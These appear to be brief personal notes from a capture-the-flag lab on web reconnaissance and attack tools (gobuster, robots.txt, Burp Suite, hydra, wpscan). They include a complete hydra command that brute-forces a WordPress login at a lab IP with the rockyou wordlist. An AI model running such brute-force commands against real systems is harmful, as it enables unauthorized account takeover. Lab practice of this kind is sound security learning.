-gobuster https scan - skip TLS cert validation (-k)
-about robot.txt
-burpsuite bruteforce(cluster bomb for 2 veriable brutefoce)
-hydra to bruteforce web
-wp scans wordpress vulnerabilities

robot.txt is used to hide unwanted web directories from public 

___bruteforce using hydra___
hydra -l Elliot -P ~/Desktop/wordlist/rockyou.txt 10.10.136.215 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"

